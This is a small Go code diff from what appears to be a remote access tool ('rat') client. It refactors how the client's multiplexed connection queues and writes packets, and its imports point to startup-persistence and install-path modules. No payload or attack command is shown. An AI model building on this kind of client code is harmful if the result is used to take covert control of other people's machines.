@@ -9,7 +9,6 @@ import (
 	"rat/client/startup"
 	"rat/shared"
 	"rat/shared/installpath"
-	"rat/shared/network"
 
 	"github.com/xtaci/smux"
 )
@@ -70,28 +69,17 @@ func start(config shared.BinaryConfig) {
 		con := Connection{
 			Conn:    session,
 			control: control,
-			Writer:  network.Writer{control},
-			Reader:  network.Reader{control},
 		}
 
 		if err != nil {
 			panic(err)
 		}
 
-		Queue = make(chan OutgoingPacket)
+		Queue = make(chan Outgoing)
 		//Transfers = make(TransfersMap)
 
-		go func() {
-			for {
-				packet := <-Queue
-
-				packet.Init()
-				con.WritePacket(packet)
-			}
-		}()
-
+		go con.writeLoop()
 		con.Init()
-
 		con.recvLoop()
 
 		/* end:
